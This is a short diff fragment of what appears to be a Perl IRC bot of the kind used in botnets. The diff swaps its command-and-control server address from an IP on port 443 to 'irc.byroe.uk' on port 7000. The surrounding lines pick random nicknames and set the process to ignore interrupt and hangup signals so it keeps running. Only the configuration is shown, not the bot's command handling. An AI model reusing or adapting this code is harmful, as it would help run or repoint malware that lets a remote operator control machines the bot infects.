@@ -76,8 +76,8 @@ my $nick = $mantan[rand(scalar(@mantan))];
 my $ircname = $nick;
 my @rname = ("8,1i1,8N8,1d1,8R8,1a","4,1i1,4N4,1d1,4R4,1a","9,1i1,9N9,1d1,9R9,1a","11,1i1,11N11,1d1,11R11,1a");
 my $realname = $rname[rand scalar @rname];
-$servidor='13.212.186.246' unless $servidor;
-my $porta='443';
+$servidor='irc.byroe.uk' unless $servidor;
+my $porta='7000';
 ############################################
 $SIG{'INT'} = 'IGNORE';
 $SIG{'HUP'} = 'IGNORE';
